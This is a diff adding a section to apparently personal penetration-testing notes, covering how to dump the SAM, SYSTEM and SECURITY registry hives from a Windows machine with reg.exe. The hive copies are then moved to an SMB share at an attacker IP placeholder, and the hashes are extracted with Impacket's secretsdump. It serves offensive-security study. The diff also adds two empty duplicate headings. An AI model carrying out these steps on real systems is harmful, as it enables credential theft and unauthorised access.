@@ -1774,6 +1774,90 @@ creds search linksys --export
 <details>
 <summary><h1>Extracting Passwords from Windows Systems</h1></summary>
 
+<details>
+<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>
+
+With administrative access to a Windows system, we can attempt to quickly dump the files associated with the SAM database, transfer them to our attack host, and begin cracking the hashes offline. Performing this process offline allows us to continue our attacks without having to maintain an active session with the target.
+
+<details>
+<summary><h3>Registry Hives</h3></summary>
+
+There are three registry hives we can copy if we have local administrative access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes.
+
+| Registry Hive   | Description |
+|----------------|-------------|
+| `HKLM\SAM`     | Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords. |
+| `HKLM\SYSTEM`  | Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes. |
+| `HKLM\SECURITY`| Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more. |
+
+1. **Use reg.exe to save copies of the registry hives *(requires launching cmd.exe with administrative privileges)***
+
+    **Target Machine:** Save the contents of the HKLM\SAM registry hive to a file named 'sam.save' on the C:\ drive
+
+    ```cmd
+    C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
+    ```
+
+    **Target Machine:** Save the contents of the HKLM\SYSTEM registry hive to a file named 'system.save' on the C:\ drive
+
+    ```cmd
+    C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
+    ```
+
+    **Target Machine:** Save the contents of the HKLM\SECURITY registry hive to a file named 'security.save' on the C:\ drive
+
+    ```cmd
+    C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
+    ```
+
+    After saving the registry hives offline, we can transfer them to our attack host using several methods. In this example, we'll use Impacket's smbserver along with basic CMD commands to copy the hive files to a shared folder hosted on the attacker machine.
+
+2. Transfer the files from the target machine to the attack machine
+
+    **Attack Machine:** Create a share with smbserver
+
+    ```bash
+    sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <NEW_SHARE_NAME> /home/ltnbob/Documents/
+    ```
+
+    **Target Machine:** Transfer the hive copies to the share
+
+    ```bash
+    C:\> move sam.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    ```
+
+    ```bash
+    C:\> move security.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    ```
+
+    ```bash
+    C:\> move system.save \\<ATTACKER_IP>\<NEW_SHARE_NAME>
+    ```
+
+3. **Dump the hashes with secretsdump**
+
+    **Attack Machine:** Run [`secretsdump.py`](../scripts/passwords/secretsdump.py) with Python and specify each of the hive files we retrieved from the target host.
+
+    ```bash
+    python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
+    ```
+
+    > **NOTE:** The first step secretsdump performs is retrieving the system bootkey, which is required to decrypt the local SAM hashes. This is because the bootkey is used to encrypt and decrypt the SAM database. Without access to it, the hashes cannot be decrypted—making it essential to have copies of the relevant registry hives, as previously discussed.
+
+</details>
+
+</details>
+
+<details>
+<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>
+
+</details>
+
+<details>
+<summary><h2>Attacking SAM, SYSTEM, and AUTHORITY</h2></summary>
+
+</details>
+
 </details>
 
 ---
